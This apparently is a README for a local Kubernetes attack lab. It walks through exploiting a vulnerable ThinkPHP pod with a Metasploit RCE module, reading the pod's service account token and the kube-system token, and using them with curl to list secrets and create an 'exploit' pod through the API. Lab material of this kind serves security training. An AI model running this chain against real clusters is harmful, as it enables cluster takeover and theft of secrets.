## Basics

Create resources:

```
kubectl apply -f redis.yaml
kubectl apply -f secrets.yaml
kubectl apply -f thinkphp.yaml
```

Ensure pods are alive:

```
kubectl describe pods
```

Checking secrets:
```
kubectl describe secrets
```

Checking config maps which may also have sensitive information:

```
kubectl describe configmap
```

Dumping JSON:
```
kubectl describe configmap -o json
```

Interacting with a pod:

```
kubectl exec -it redis -- /bin/sh
```

Getting a JWT token for the kube-system namespace:

```
kubectl -n kube-system describe secret default

# For use in CURLs
jwt_token=$(kubectl get secret -n kube-system $(kubectl -n kube-system get serviceaccount default -o jsonpath="{.secrets[0].name}") -o jsonpath="{.data.token}" | base64 --decode)

echo $jwt_token
```

## Thinkphp session

Ensure the pod has been created and alive:
```
kubectl apply -f thinkphp.yaml
kubectl get deployments thinkphp
```

Access the pod from localhost, in lieu of setting up ingress properly:

```
kubectl port-forward deployment/thinkphp 8000:80
```

Run the Metasploit exploit module:

```
use exploit/unix/webapp/thinkphp_rce
run http://localhost:8000
```

Acquire a shell, and verify the service token is in the container:
```
cat /run/secrets/kubernetes.io/serviceaccount/token
```

## Testing volume exploit

```
kubectl delete pod generate-this-later-pod 2>/dev/null; kubectl apply -f ./exploit.yml
```

Directly interacting with it:
```
kubectl exec -it generate-this-later-pod -- /bin/sh
```

## API

The OpenAPI approach looks interesting, as we can generate clients in the same way as Swagger:

https://kubernetes.io/blog/2016/12/kubernetes-supports-openapi/

Note that the namespace would be in the URI `api/v1/namespaces/{namespace_name}/`
You can also retrieve the list of namespaces locally with:

```
kubectl get namespaces
kubectl get namespaces -o json
```

### JWT_TOKEN

Note that the curl examples assume the `jwt_token` is set.

If you're on your host with `kubectl` available:

```
jwt_token=$(kubectl get secret -n kube-system $(kubectl -n kube-system get serviceaccount default -o jsonpath="{.secrets[0].name}") -o jsonpath="{.data.token}" | base64 --decode)

echo $jwt_token
```

If you're in a container already:

```
jwt_token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
echo $jwt_token
```

### Get namespaces

```
curl --insecure --request GET \
--url 'https://kubernetes.docker.internal:6443/api/v1/namespaces' \
--header "Authorization: Bearer ${jwt_token}"
```

### Get PODs

```
curl --insecure --request GET \
  --url 'https://kubernetes.docker.internal:6443/api/v1/namespaces/default/pods' \
  --header "Authorization: Bearer ${jwt_token}"
```

### Get Secrets

```
curl --insecure --request GET \
  --url 'https://kubernetes.docker.internal:6443/api/v1/namespaces/default/secrets' \
  --header "Authorization: Bearer ${jwt_token}"
```

### Get Configmaps

```
curl --insecure --request GET \
  --url 'https://kubernetes.docker.internal:6443/api/v1/namespaces/default/configmaps' \
  --header "Authorization: Bearer ${jwt_token}"
```

### Create a pod

```
yq -o json e ./exploit.yml |
  curl --insecure -v --request POST \
    --url 'https://kubernetes.docker.internal:6443/api/v1/namespaces/default/pods' \
    --header "Authorization: Bearer ${jwt_token}" \
    --header 'Content-Type: application/json' \
    --data @-
```

### Management

Clean up:

```
kubectl delete deployments,pods,services --all
```

Running the Kubernetes [Dashboard UI](https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/):

```
kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.3.1/aio/deploy/recommended.yaml

kubectl proxy
```

Now visit:

http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/#/login

To login, use the `jwt_token` mentioned above
